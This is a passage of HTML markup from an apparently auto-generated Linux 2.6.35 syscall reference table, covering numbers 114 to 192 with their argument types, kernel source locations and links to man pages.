href="http://lxr.free-electrons.com/source/arch/x86/include/asm/vm86.h?v=2.6.35#L96">struct vm86_struct __user *</a></td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>114</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/wait4.2.html">sys_wait4</a></td><td>0x72</td><td>pid_t pid</td><td>int __user *stat_addr</td><td>int options</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22">struct rusage __user *ru</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1726">kernel&#x2F;exit.c:1726</a></td></tr><tr><td>115</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapoff.2.html">sys_swapoff</a></td><td>0x73</td><td>const char __user *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/swapfile.c?v=2.6.35#L1533">mm&#x2F;swapfile.c:1533</a></td></tr><tr><td>116</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysinfo.2.html">sys_sysinfo</a></td><td>0x74</td><td>struct sysinfo __user *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1565">kernel&#x2F;timer.c:1565</a></td></tr><tr><td>117</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ipc.2.html">sys_ipc</a></td><td>0x75</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/syscall.c?v=2.6.35#L16">ipc&#x2F;syscall.c:16</a></td></tr><tr><td>118</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsync.2.html">sys_fsync</a></td><td>0x76</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L221">fs&#x2F;sync.c:221</a></td></tr><tr><td>119</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigreturn.2.html">sys_sigreturn</a></td><td>0x77</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L758">arch&#x2F;alpha&#x2F;kernel&#x2F;entry.S:758</a></td></tr><tr><td>120</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clone.2.html">sys_clone</a></td><td>0x78</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *</a></td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L733">arch&#x2F;alpha&#x2F;kernel&#x2F;entry.S:733</a></td></tr><tr><td>121</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setdomainname.2.html">sys_setdomainname</a></td><td>0x79</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1214">kernel&#x2F;sys.c:1214</a></td></tr><tr><td>122</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newuname.2.html">sys_newuname</a></td><td>0x7a</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L24">struct new_utsname __user *name</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1097">kernel&#x2F;sys.c:1097</a></td></tr><tr><td>123</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/modify_ldt.2.html">sys_modify_ldt</a></td><td>0x7b</td><td>int</td><td>void __user *</td><td>unsigned long</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>124</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/adjtimex.2.html">sys_adjtimex</a></td><td>0x7c</td><td><a href="http://lxr.free-electrons.com/source/include/linux/timex.h?v=2.6.35#L64">struct timex __user *txc_p</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L206">kernel&#x2F;time.c:206</a></td></tr><tr><td>125</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mprotect.2.html">sys_mprotect</a></td><td>0x7d</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mprotect.c?v=2.6.35#L221">mm&#x2F;mprotect.c:221</a></td></tr><tr><td>126</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigprocmask.2.html">sys_sigprocmask</a></td><td>0x7e</td><td>int how</td><td>old_sigset_t __user *set</td><td>old_sigset_t __user *oset</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2573">kernel&#x2F;signal.c:2573</a></td></tr><tr><td>127</td><td>not implemented</td><td>0x7f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>128</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/init_module.2.html">sys_init_module</a></td><td>0x80</td><td>void __user *umod</td><td>unsigned long len</td><td>const char __user *uargs</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/module.c?v=2.6.35#L2611">kernel&#x2F;module.c:2611</a></td></tr><tr><td>129</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/delete_module.2.html">sys_delete_module</a></td><td>0x81</td><td>const char __user *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/module.c?v=2.6.35#L720">kernel&#x2F;module.c:720</a></td></tr><tr><td>130</td><td>not implemented</td><td>0x82</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>131</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/quotactl.2.html">sys_quotactl</a></td><td>0x83</td><td>unsigned int cmd</td><td>const char __user *special</td><td>qid_t id</td><td>void __user *addr</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/quota/quota.c?v=2.6.35#L333">fs&#x2F;quota&#x2F;quota.c:333</a></td></tr><tr><td>132</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgid.2.html">sys_getpgid</a></td><td>0x84</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L990">kernel&#x2F;sys.c:990</a></td></tr><tr><td>133</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchdir.2.html">sys_fchdir</a></td><td>0x85</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L382">fs&#x2F;open.c:382</a></td></tr><tr><td>134</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/bdflush.2.html">sys_bdflush</a></td><td>0x86</td><td>int func</td><td>long data</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/buffer.c?v=2.6.35#L3278">fs&#x2F;buffer.c:3278</a></td></tr><tr><td>135</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysfs.2.html">sys_sysfs</a></td><td>0x87</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/filesystems.c?v=2.6.35#L182">fs&#x2F;filesystems.c:182</a></td></tr><tr><td>136</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/personality.2.html">sys_personality</a></td><td>0x88</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exec_domain.c?v=2.6.35#L191">kernel&#x2F;exec_domain.c:191</a></td></tr><tr><td>137</td><td>not implemented</td><td>0x89</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>138</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid16.2.html">sys_setfsuid16</a></td><td>0x8a</td><td>old_uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L118">kernel&#x2F;uid16.c:118</a></td></tr><tr><td>139</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid16.2.html">sys_setfsgid16</a></td><td>0x8b</td><td>old_gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L126">kernel&#x2F;uid16.c:126</a></td></tr><tr><td>140</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llseek.2.html">sys_llseek</a></td><td>0x8c</td><td>unsigned int fd</td><td>unsigned long offset_high</td><td>unsigned long offset_low</td><td>loff_t __user *result</td><td>unsigned int origin</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L191">fs&#x2F;read_write.c:191</a></td></tr><tr><td>141</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html">sys_getdents</a></td><td>0x8d</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L135">struct linux_dirent __user *dirent</a></td><td>unsigned int count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L191">fs&#x2F;readdir.c:191</a></td></tr><tr><td>142</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/select.2.html">sys_select</a></td><td>0x8e</td><td>int n</td><td>fd_set __user *inp</td><td>fd_set __user *outp</td><td>fd_set __user *exp</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20">struct timeval __user *tvp</a></td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L596">fs&#x2F;select.c:596</a></td></tr><tr><td>143</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flock.2.html">sys_flock</a></td><td>0x8f</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/locks.c?v=2.6.35#L1569">fs&#x2F;locks.c:1569</a></td></tr><tr><td>144</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msync.2.html">sys_msync</a></td><td>0x90</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/msync.c?v=2.6.35#L31">mm&#x2F;msync.c:31</a></td></tr><tr><td>145</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readv.2.html">sys_readv</a></td><td>0x91</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L711">fs&#x2F;read_write.c:711</a></td></tr><tr><td>146</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/writev.2.html">sys_writev</a></td><td>0x92</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L732">fs&#x2F;read_write.c:732</a></td></tr><tr><td>147</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsid.2.html">sys_getsid</a></td><td>0x93</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1027">kernel&#x2F;sys.c:1027</a></td></tr><tr><td>148</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fdatasync.2.html">sys_fdatasync</a></td><td>0x94</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L226">fs&#x2F;sync.c:226</a></td></tr><tr><td>149</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysctl.2.html">sys_sysctl</a></td><td>0x95</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sysctl.h?v=2.6.35#L36">struct __sysctl_args __user *args</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sysctl_binary.c?v=2.6.35#L1462">kernel&#x2F;sysctl_binary.c:1462</a></td></tr><tr><td>150</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlock.2.html">sys_mlock</a></td><td>0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L491">mm&#x2F;mlock.c:491</a></td></tr><tr><td>151</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlock.2.html">sys_munlock</a></td><td>0x97</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L519">mm&#x2F;mlock.c:519</a></td></tr><tr><td>152</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlockall.2.html">sys_mlockall</a></td><td>0x98</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L556">mm&#x2F;mlock.c:556</a></td></tr><tr><td>153</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlockall.2.html">sys_munlockall</a></td><td>0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L584">mm&#x2F;mlock.c:584</a></td></tr><tr><td>154</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setparam.2.html">sys_sched_setparam</a></td><td>0x9a</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46">struct sched_param __user *param</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4616">kernel&#x2F;sched.c:4616</a></td></tr><tr><td>155</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getparam.2.html">sys_sched_getparam</a></td><td>0x9b</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46">struct sched_param __user *param</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4651">kernel&#x2F;sched.c:4651</a></td></tr><tr><td>156</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setscheduler.2.html">sys_sched_setscheduler</a></td><td>0x9c</td><td>pid_t pid</td><td>int policy</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46">struct sched_param __user *param</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4601">kernel&#x2F;sched.c:4601</a></td></tr><tr><td>157</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getscheduler.2.html">sys_sched_getscheduler</a></td><td>0x9d</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4625">kernel&#x2F;sched.c:4625</a></td></tr><tr><td>158</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_yield.2.html">sys_sched_yield</a></td><td>0x9e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4851">kernel&#x2F;sched.c:4851</a></td></tr><tr><td>159</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_max.2.html">sys_sched_get_priority_max</a></td><td>0x9f</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4989">kernel&#x2F;sched.c:4989</a></td></tr><tr><td>160</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_min.2.html">sys_sched_get_priority_min</a></td><td>0xa0</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L5014">kernel&#x2F;sched.c:5014</a></td></tr><tr><td>161</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_rr_get_interval.2.html">sys_sched_rr_get_interval</a></td><td>0xa1</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *interval</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L5039">kernel&#x2F;sched.c:5039</a></td></tr><tr><td>162</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nanosleep.2.html">sys_nanosleep</a></td><td>0xa2</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *rqtp</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *rmtp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/hrtimer.c?v=2.6.35#L1606">kernel&#x2F;hrtimer.c:1606</a></td></tr><tr><td>163</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mremap.2.html">sys_mremap</a></td><td>0xa3</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td><a href="http://lxr.free-electrons.com/source/mm/mremap.c?v=2.6.35#L510">mm&#x2F;mremap.c:510</a></td></tr><tr><td>164</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid16.2.html">sys_setresuid16</a></td><td>0xa4</td><td>old_uid_t ruid</td><td>old_uid_t euid</td><td>old_uid_t suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L75">kernel&#x2F;uid16.c:75</a></td></tr><tr><td>165</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid16.2.html">sys_getresuid16</a></td><td>0xa5</td><td>old_uid_t __user *ruid</td><td>old_uid_t __user *euid</td><td>old_uid_t __user *suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L84">kernel&#x2F;uid16.c:84</a></td></tr><tr><td>166</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vm86.2.html">sys_vm86</a></td><td>0xa6</td><td>unsigned long</td><td>unsigned long</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>167</td><td>not implemented</td><td>0xa7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>168</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/poll.2.html">sys_poll</a></td><td>0xa8</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/poll.h?v=2.6.35#L31">struct pollfd __user *ufds</a></td><td>unsigned int nfds</td><td>long timeout</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L915">fs&#x2F;select.c:915</a></td></tr><tr><td>169</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nfsservctl.2.html">sys_nfsservctl</a></td><td>0xa9</td><td>int cmd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/nfsd/syscall.h?v=2.6.35#L77">struct nfsctl_arg __user *arg</a></td><td>void __user *res</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/nfsctl.c?v=2.6.35#L86">fs&#x2F;nfsctl.c:86</a></td></tr><tr><td>170</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid16.2.html">sys_setresgid16</a></td><td>0xaa</td><td>old_gid_t rgid</td><td>old_gid_t egid</td><td>old_gid_t sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L96">kernel&#x2F;uid16.c:96</a></td></tr><tr><td>171</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid16.2.html">sys_getresgid16</a></td><td>0xab</td><td>old_gid_t __user *rgid</td><td>old_gid_t __user *egid</td><td>old_gid_t __user *sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L106">kernel&#x2F;uid16.c:106</a></td></tr><tr><td>172</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/prctl.2.html">sys_prctl</a></td><td>0xac</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1466">kernel&#x2F;sys.c:1466</a></td></tr><tr><td>173</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigreturn.2.html">sys_rt_sigreturn</a></td><td>0xad</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L771">arch&#x2F;alpha&#x2F;kernel&#x2F;entry.S:771</a></td></tr><tr><td>174</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigaction.2.html">sys_rt_sigaction</a></td><td>0xae</td><td>int sig</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/signal.h?v=2.6.35#L123">const struct sigaction __user *act</a></td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/signal.h?v=2.6.35#L123">struct sigaction __user *oact</a></td><td>size_t sigsetsize</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2624">kernel&#x2F;signal.c:2624</a></td></tr><tr><td>175</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigprocmask.2.html">sys_rt_sigprocmask</a></td><td>0xaf</td><td>int how</td><td>sigset_t __user *set</td><td>sigset_t __user *oset</td><td>size_t sigsetsize</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2111">kernel&#x2F;signal.c:2111</a></td></tr><tr><td>176</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigpending.2.html">sys_rt_sigpending</a></td><td>0xb0</td><td>sigset_t __user *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2171">kernel&#x2F;signal.c:2171</a></td></tr><tr><td>177</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigtimedwait.2.html">sys_rt_sigtimedwait</a></td><td>0xb1</td><td>const sigset_t __user *uthese</td><td>siginfo_t __user *uinfo</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">const struct timespec __user *uts</a></td><td>size_t sigsetsize</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2242">kernel&#x2F;signal.c:2242</a></td></tr><tr><td>178</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigqueueinfo.2.html">sys_rt_sigqueueinfo</a></td><td>0xb2</td><td>int pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2404">kernel&#x2F;signal.c:2404</a></td></tr><tr><td>179</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigsuspend.2.html">sys_rt_sigsuspend</a></td><td>0xb3</td><td>sigset_t __user *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2710">kernel&#x2F;signal.c:2710</a></td></tr><tr><td>180</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pread64.2.html">sys_pread64</a></td><td>0xb4</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>181</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwrite64.2.html">sys_pwrite64</a></td><td>0xb5</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>182</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown16.2.html">sys_chown16</a></td><td>0xb6</td><td>const char __user *filename</td><td>old_uid_t user</td><td>old_gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L19">kernel&#x2F;uid16.c:19</a></td></tr><tr><td>183</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcwd.2.html">sys_getcwd</a></td><td>0xb7</td><td>char __user *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/dcache.c?v=2.6.35#L2104">fs&#x2F;dcache.c:2104</a></td></tr><tr><td>184</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capget.2.html">sys_capget</a></td><td>0xb8</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/capability.c?v=2.6.35#L161">kernel&#x2F;capability.c:161</a></td></tr><tr><td>185</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capset.2.html">sys_capset</a></td><td>0xb9</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/capability.c?v=2.6.35#L235">kernel&#x2F;capability.c:235</a></td></tr><tr><td>186</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaltstack.2.html">sys_sigaltstack</a></td><td>0xba</td><td>const stack_t __user *</td><td>stack_t __user *</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/signal.c?v=2.6.35#L199">arch&#x2F;alpha&#x2F;kernel&#x2F;signal.c:199</a></td></tr><tr><td>187</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile.2.html">sys_sendfile</a></td><td>0xbb</td><td>int out_fd</td><td>int in_fd</td><td>off_t __user *offset</td><td>size_t count</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L897">fs&#x2F;read_write.c:897</a></td></tr><tr><td>188</td><td>not implemented</td><td>0xbc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>189</td><td>not implemented</td><td>0xbd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>190</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vfork.2.html">sys_vfork</a></td><td>0xbe</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L746">arch&#x2F;alpha&#x2F;kernel&#x2F;entry.S:746</a></td></tr><tr><td>191</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrlimit.2.html">sys_getrlimit</a></td><td>0xbf</td><td>unsigned int resource</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41">struct rlimit __user *rlim</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1237">kernel&#x2F;sys.c:1237</a></td></tr><tr><td>192</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mmap_pgoff.2.html">sys_mmap_pgoff</a></td><td>0xc0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1091">mm&#x2F;mmap.c:1091</a></td></tr><tr><td>193</td><td><a 